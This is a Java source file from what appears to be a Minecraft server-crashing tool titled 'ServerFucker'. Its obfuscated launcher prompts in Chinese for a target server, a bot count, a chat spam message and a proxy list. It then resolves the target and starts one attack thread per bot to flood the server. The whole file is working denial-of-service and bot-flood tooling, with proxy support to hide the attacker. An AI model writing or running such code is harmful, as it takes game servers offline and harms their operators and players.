package xyz.zihaoxu;

import com.github.steveice10.packetlib.ProxyInfo;
import com.github.steveice10.packetlib.tcp.TcpSession;
import org.xbill.DNS.*;
import org.xbill.DNS.Record;

import javax.script.ScriptException;
import java.io.*;
import java.net.UnknownHostException;
import java.util.Objects;
import java.util.Scanner;
import java.util.stream.Collectors;

public class IIIIlllllI { // Class: ServerCrasher
    private String[] qqqqqq; // args
    public static String dnsServer="8.8.8.8";
    public IIIIlllllI(String[] awaaaa/*args*/){
        this.qqqqqq =awaaaa;
    }

    public void aaaawawaw() throws IOException, ScriptException { // Method: run()
        Scanner aaaaawa=new Scanner(System.in); // scanner
        System.out.println("==============================");
        System.out.println("ServerFucker - By 星空-幻想");
        // System.out.println("为Sysrom祈祷 :)");
        System.out.println("==============================");

        // 加载脚本
        try {
            System.out.println("正在加载脚本");
            Main.scriptManager.init();
            Main.scriptManager.loadFolder(new File("scripts"));
        } catch (Throwable t) {
            System.err.println("脚本加载失败");
            t.printStackTrace();
        }

        // region 设定目标
        System.out.println("崩服器即将启动,在那之前你需要填写一些信息");
        System.out.print("攻击的目标: ");
        String target = "";
        if (aaaaawa.hasNextLine()){ // scanner.hasNextLine() 下同
            target= aaaaawa.nextLine();
        }
        Main.scriptManager.call("target_selected", target); // target_selected事件
        System.out.println("正在解析地址");
        String host; // 这边懒得混淆了
        int port=25565;

        // region 这一整段都是那个抽了风的地址解析
        String[] temp = target.split(":");
        if (temp.length==2){
            host=temp[0];
            port=Integer.parseInt(temp[1]);
        }else {
            Lookup lookup=new Lookup("_minecraft._tcp."+temp[0], Type.SRV);
            lookup.setResolver(new SimpleResolver(dnsServer));
            Record[] records=lookup.run();
            if (records!=null && records.length>0){
                System.out.println("检测到srv记录,将使用srv解析结果");
                host=((SRVRecord)records[0]).getTarget().toString().replaceFirst("\\.$", "");
                port=((SRVRecord)records[0]).getPort();
            }else {
                host=temp[0];
            }
        }
        Lookup lookup=new Lookup(host,Type.A);
        lookup.setResolver(new SimpleResolver(dnsServer));
        Record[] records=lookup.run();
        if (records!=null && records.length>0){
            host=((ARecord)records[0]).getAddress().getHostAddress();
        }
        System.out.println("解析完成:"+host+":"+port);
        // endregion
        Main.scriptManager.call("dns_resolved", host, port);
        llllllllllII.lllIlIll =host; // Configure.host = host;
        llllllllllII.IllIlIl =port; // Configure.port = port;
        // endregion

        // region 配置bot
        System.out.println("你希望机器人的名字以什么开头?");
        System.out.print("留空以随机: ");
        String prefix="";
        if(aaaaawa.hasNextLine()){
            prefix=aaaaawa.nextLine();
        }
        llllllllllII.anString =prefix;
        System.out.print("你期望的机器人的数量: ");
        int count=100;
        if (aaaaawa.hasNextLine()){
            count= Integer.parseInt(aaaaawa.nextLine());
        }
        llllllllllII.an114514 =count;
        Main.scriptManager.call("bot_configured", prefix, count);
        // endregion

        System.out.println("是否以最小化运行?(true/false)");
        System.out.println("默认为false: ");
        String mimi="";
        if (aaaaawa.hasNextLine()){
            mimi= aaaaawa.nextLine();
        }
        llllllllllII.aaawwawwa= Objects.equals(mimi, "true");
        if (!llllllllllII.aaawwawwa) {
            String text = "";
            System.out.println("你希望机器人进入服务器之后发送什么内容?");
            System.out.print("留空以不发送: ");
            if (aaaaawa.hasNextLine()) {
                text = aaaaawa.nextLine();
            }
            llllllllllII.ananan = text;
        }

        // region 配置代理
        System.out.println("最后一步,你希望使用代理吗?如果是,输入代理文件的地址(.txt格式)");
        System.out.print("留空以不使用: ");
        String aawaw="";
        if (aaaaawa.hasNextLine()){
            aawaw= aaaaawa.nextLine();
        }
        llllllllllII.aawawa=aawaw;
        if (aawaw!=""){
            File llIlIIl = new File(aawaw);
            BufferedReader reader=new BufferedReader(new FileReader(llIlIIl));
            llllllllllII.aaawww=reader.lines().collect(Collectors.toList());
            System.out.println("代理的类型是?(SOCKS4/SOCKS5/HTTP)");
            System.out.print("留空默认SOCKS4: ");
            String ttttt="";
            if (aaaaawa.hasNextLine()){
                ttttt= aaaaawa.nextLine();
            }
            if (!ttttt.isEmpty()){
                llllllllllII.IIlllIL =ProxyInfo.Type.valueOf(ttttt.toUpperCase()); // 我不知道这样写会不会出事
                // 反正我没给这个东西用过除了SOCKS4以外的代理
            }
        }
        // endregion

        System.out.println("准备启动...");
        Main.scriptManager.call("pre_start");
        this.awawa(); // this.run()
    }

    public void awawa(){ // run()
        for (int i = 0; i< llllllllllII.an114514; i++){
            new Thread(new IIIIlllIl()).start();
        }
        new Thread(new IllIll()).start();
        // 这个就是我在群里发的那个gc循环的线程
        // 当然后面发现有没有其实没啥不同
    }
}